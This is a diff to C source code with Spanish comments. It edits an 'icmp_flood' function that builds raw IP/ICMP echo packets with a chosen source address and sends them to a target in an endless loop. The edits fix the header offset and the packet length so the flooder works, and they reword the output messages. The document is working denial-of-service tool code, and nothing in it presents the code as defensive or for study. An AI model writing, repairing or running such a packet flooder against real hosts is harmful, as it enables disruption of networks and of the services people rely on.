@@ -16,10 +16,8 @@
 #include "./includes/icmp.h"
 
 #define DATAGRAM_LEN 4096
-#define IP4_HDRLEN 20         // longitud ip header
-#define ICMP_HDRLEN 8         // longitud header icmp echo
 
-// Funcion que crea un datagrama UDP con la direccion de origen, destino y payload proporcionos
+// Funcion que un paquete ICMP ECHO
 void icmp_flood(int sock, char* src, char* dst, int puerto){
     while(1){
         // direccion IP de destino
@@ -31,14 +29,14 @@ void icmp_flood(int sock, char* src, char* dst, int puerto){
 
         // direccion IP de origen
         struct sockaddr_in saddr;
-        if(host_addr(&saddr, src, (rand() % 6000)) == 1){
+        if(host_addr(&saddr, src, (rand() % 65535)) == 1){
             perror("Error al crear la configuracion IP");
             exit(1);
         }
 
         char *datagram = calloc(DATAGRAM_LEN, sizeof(char));
 
-        struct icmphdr *icmph = (struct icmphdr *) datagram;
+        struct icmphdr *icmph = (struct icmphdr *) (datagram + sizeof(struct iphdr));
 
         icmph->type = ICMP_ECHO;         // ICMP tipo echo
         icmph->code = 0;                 // ICMP codigo
@@ -53,7 +51,7 @@ void icmp_flood(int sock, char* src, char* dst, int puerto){
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = IP4_HDRLEN + ICMP_HDRLEN;
+        iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
         iph->id = htonl(rand() % 78123);
         iph->frag_off = 0;
         iph->ttl = MAXTTL;
@@ -66,9 +64,10 @@ void icmp_flood(int sock, char* src, char* dst, int puerto){
         iph->check = csum ((unsigned short *) datagram, iph->tot_len);
         if(sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
         {
-            perror("No se ha podido enviar el datagrama");
+            perror("No se ha podido enviar el paquete ICMP");
+            exit(1);
         } else {
-            printf ("Datagrama enviado. Tamaño : %d \n" , iph->tot_len);
+            printf ("Paquete ICMP enviado a %s. Tamaño : %d \n", dst, iph->tot_len);
         }
     }
 }
